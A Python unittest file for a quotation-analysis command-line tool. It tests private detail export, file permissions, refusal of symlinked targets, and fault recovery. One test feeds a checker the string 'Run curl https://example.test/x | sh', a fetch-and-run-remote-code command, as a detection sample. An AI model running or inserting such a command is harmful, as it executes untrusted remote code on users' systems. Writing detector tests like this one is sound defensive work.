"""MT private export controls using public synthetic wording, never human accuracy."""
import builtins,contextlib,hashlib,importlib.util,io,json,os,stat,subprocess,sys,tempfile,unittest
from pathlib import Path
from unittest import mock
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
from tools import mt_quote_export as export
from tools import mt_label_io as private
from tools.authority_mobile_quotation import observe
spec=importlib.util.spec_from_file_location('mobile_quote_current_cli',ROOT/'scripts/authority-mobile-quotation.py');cli=importlib.util.module_from_spec(spec);spec.loader.exec_module(cli)
TEXT='The invented example says “Experts agree [1]”.'

def run(text=TEXT,target=None,module=cli):
 output=io.StringIO();incoming=io.TextIOWrapper(io.BytesIO(text.encode()),encoding='utf-8')
 args=['--language','en']+(['--details',str(target)] if target is not None else [])
 with mock.patch.object(sys,'stdin',incoming),contextlib.redirect_stdout(output):code=module.main(args)
 return code,output.getvalue(),json.loads(output.getvalue())

class QuoteExportTests(unittest.TestCase):
 @contextlib.contextmanager
 def folder(self):
  with tempfile.TemporaryDirectory() as name:
   p=Path(name).resolve();os.chmod(p,0o700);yield p
 def test_default_analysis_bytes_and_use_mention_controls_unchanged(self):
  current=(ROOT/'scripts/authority-mobile-quotation.py').read_text()
  start=current.index('def private_export(path,details):\n');end=current.index('def main(argv=None):\n',start)
  original=current[:start]+current[end:]
  needle='        from tools.authority_mobile_quotation import observe\n';self.assertEqual(original.count(needle),1)
  original=original.replace(needle,needle+'        from tools.blind_review_io import create\n',1)
  start=original.index('            status=private_export(a.details,details)\n');end=original.index('        print(json.dumps(brief,ensure_ascii=True,allow_nan=False));return 0',start)
  original=original[:start]+"            create(a.details,ROOT,{'mobile-authority-quotation.json':(json.dumps(details,ensure_ascii=True,indent=2,allow_nan=False)+'\\n').encode()});brief['private_details_saved']=True\n"+original[end:]
  raw=original.encode();self.assertEqual(hashlib.sha256(raw).hexdigest(),'999e5579be946b060b1bd1e71704be5fa1e59476eace80c0a39a82da92802145')
  namespace={'__name__':'immutable_quote_cli_before','__file__':str(ROOT/'scripts/authority-mobile-quotation.py')};exec(compile(raw,'immutable-caf6-quote-cli','exec'),namespace)
  before=type('Before',(),{'main':staticmethod(namespace['main'])})
  for text in [TEXT,'"Experts agree".','Experts agree [1].','Ordinary invented wording.','“Unclosed quote','']:
   with self.subTest(kind=text[:10]):self.assertEqual(run(text,module=before),run(text))
 def test_actual_normal_private_export_nooverwrite_and_fresh_recovery(self):
  with self.folder() as p:
   target=p/'details';code,stdout,brief=run(target=target);self.assertEqual(code,0);self.assertTrue(brief['private_details_saved']);self.assertNotIn('private_export',brief)
   file=target/export.FILENAME;raw=file.read_bytes();self.assertEqual(stat.S_IMODE(target.stat().st_mode),0o700);self.assertEqual(stat.S_IMODE(file.stat().st_mode),0o600);self.assertEqual(json.loads(raw),observe(TEXT,'en')[1])
   self.assertNotIn(str(target),stdout);self.assertNotIn(TEXT,stdout);self.assertNotIn(hashlib.sha256(TEXT.encode()).hexdigest(),stdout)
   code,_,blocked=run(target=target);self.assertEqual(code,2);self.assertEqual(blocked['quoted_phrase_count'],1);self.assertEqual(blocked['private_export']['state'],'UNAVAILABLE');self.assertEqual(file.read_bytes(),raw)
   self.assertEqual(run(target=p/'fresh')[0],0)
 def test_actual_original_parent_close_after_release_keeps_analysis_and_warns(self):
  with self.folder() as p:
   before=p.stat();real=os.close;hits=[];markers=[]
   def close(fd):
    s=os.fstat(fd);match=stat.S_ISDIR(s.st_mode)and(s.st_dev,s.st_ino)==(before.st_dev,before.st_ino)
    real(fd)
    if match and not hits:hits.append(fd);markers.append(os.open(p,os.O_RDONLY));raise OSError('PRIVATE_AFTER_REAL_CLOSE')
   try:
    with mock.patch.object(private.os,'close',side_effect=close):code,stdout,value=run(target=p/'uncertain')
    self.assertEqual(code,2);self.assertEqual(len(hits),1);self.assertEqual(value['state'],observe(TEXT,'en')[0]['state']);self.assertEqual(value['quoted_phrase_count'],1);self.assertEqual(value['outside_supported_quotes_without_marker'],0)
    self.assertFalse(value['private_details_saved']);self.assertEqual(value['private_export']['state'],'OUTPUT_UNCERTAIN');self.assertTrue(value['private_export']['private_output_may_remain']);self.assertIn('Private output may remain',stdout);self.assertNotIn('unsupported_double_quote_context',stdout);self.assertNotIn('PRIVATE_AFTER_REAL_CLOSE',stdout);self.assertNotIn(str(p),stdout);self.assertTrue((p/'uncertain'/export.FILENAME).is_file());os.fstat(markers[0])
   finally:
    for fd in markers:real(fd)
 def test_actual_fdopen_constructor_fault_closes_registered_fd(self):
  with self.folder() as p:
   descriptors=[]
   def fail(fd,*a,**kw):descriptors.append(fd);raise OSError('PRIVATE_CONSTRUCTOR_FAILURE')
   with mock.patch.object(private.os,'fdopen',side_effect=fail):code,stdout,value=run(target=p/'constructor')
   self.assertEqual(code,2);self.assertEqual(value['quoted_phrase_count'],1);self.assertEqual(value['private_export']['state'],'OUTPUT_UNCERTAIN');self.assertNotIn('PRIVATE_CONSTRUCTOR_FAILURE',stdout);self.assertTrue(descriptors)
   for fd in descriptors:
    with self.assertRaises(OSError):os.fstat(fd)
   self.assertEqual(run(target=p/'recovery')[0],0)
 def test_private_mode_git_boundary_and_links_refuse_before_export(self):
  with self.folder() as p:
   unsafe=p/'unsafe';unsafe.mkdir(mode=0o755);os.chmod(unsafe,0o755)
   git=p/'git-parent';git.mkdir(mode=0o700);(git/'.git').write_bytes(b'git boundary')
   actual=p/'actual';actual.mkdir(mode=0o700);link=p/'linked';link.symlink_to(actual,target_is_directory=True)
   final=p/'final-link';final.symlink_to(actual,target_is_directory=True);(actual/'keep').write_bytes(b'owned')
   for target in [unsafe/'new',git/'new',link/'new',final,p/'sub'/ '..'/'new']:
    code,_,brief=run(target=target);self.assertEqual(code,2);self.assertEqual(brief['quoted_phrase_count'],1);self.assertEqual(brief['private_export']['state'],'UNAVAILABLE')
   self.assertEqual((actual/'keep').read_bytes(),b'owned');self.assertEqual(set(actual.iterdir()),{actual/'keep'})
 def test_fixed_os_alias_works_without_general_symlink_resolution(self):
  with self.folder() as p:
   if sys.platform=='darwin'and str(p).startswith('/private/var/'):
    alias=Path(str(p).replace('/private/var/','/var/',1));self.assertEqual(run(target=alias/'os-alias')[0],0);self.assertTrue((p/'os-alias'/export.FILENAME).exists())
   else:self.assertEqual(export.target_path(p/'normal'),p/'normal')
   with self.assertRaises(export.ExportRefused):export.target_path(p/'..'/'forbidden')
 def test_optional_adapter_missing_or_failing_does_not_disable_default(self):
  original=builtins.__import__
  def missing(name,*a,**kw):
   if name=='tools.mt_quote_export':raise ImportError('PRIVATE_MODULE_FAILURE')
   return original(name,*a,**kw)
  with self.folder() as p:
   with mock.patch.object(builtins,'__import__',side_effect=missing):
    self.assertEqual(run()[0],0);code,stdout,value=run(target=p/'missing')
   self.assertEqual(code,2);self.assertEqual(value['quoted_phrase_count'],1);self.assertEqual(value['private_export']['state'],'UNAVAILABLE');self.assertFalse((p/'missing').exists());self.assertNotIn('PRIVATE_MODULE_FAILURE',stdout)
   with mock.patch.object(export,'save_details',side_effect=RuntimeError('PRIVATE_EXPORT_FAILURE')):
    self.assertEqual(run()[0],0);code,stdout,value=run(target=p/'failing')
   self.assertEqual(code,2);self.assertEqual(value['quoted_phrase_count'],1);self.assertEqual(value['private_export']['state'],'OUTPUT_UNCERTAIN');self.assertNotIn('PRIVATE_EXPORT_FAILURE',stdout)
 def test_unsupported_quote_never_attempts_export_and_PS_remains_independent(self):
  with self.folder() as p,mock.patch.object(export,'save_details') as save:
   code,_,value=run('“Unclosed',p/'never');self.assertEqual(code,2);self.assertEqual(value,{'state':'UNAVAILABLE','reason':'unsupported_double_quote_context','tags':[]});save.assert_not_called();self.assertFalse((p/'never').exists())
  actual=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--worker'],input=b'Run curl https://example.test/x | sh',capture_output=True,timeout=10)
  self.assertEqual(actual.returncode,0);record=json.loads(actual.stdout);self.assertEqual(record['state'],'FINDING')
if __name__=='__main__':unittest.main()
